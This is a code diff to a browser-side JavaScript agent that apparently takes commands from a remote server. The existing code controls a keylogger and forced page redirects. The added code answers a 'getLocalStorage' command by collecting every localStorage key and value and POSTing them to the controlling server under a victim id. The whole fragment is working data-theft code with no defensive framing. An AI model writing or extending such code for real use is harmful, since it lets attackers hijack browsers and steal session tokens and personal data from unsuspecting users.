@@ -68,14 +68,29 @@
             stopKeyLogger();
         } else if (data.type == 'goToUrl') {
             window.location.href = data.metaData;
+        } else if (data.type == 'getLocalStorage') {
+            var localStorageContent = [];
+            for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                var value = localStorage[key];
+                var combined = 'key: ' + key + ', value: ' + value;
+                localStorageContent.push(combined);
+            }
+            sendCommandToServer('receiveLocaleStorage', localStorageContent);
         }
 
     };
 
     function sendCommandToServer(type, data) {
+        var url = devUrl + type + '/' + currentId;
+
+        if(type == 'receiveLocaleStorage') {
+            data = ({data: data});
+        }
+
         $.ajax({
                    type: "POST",
-                   url: devUrl + type + '/' + currentId,
+                   url: url,
                    data: data,
                    contentType: "application/json; charset=utf-8"
                });
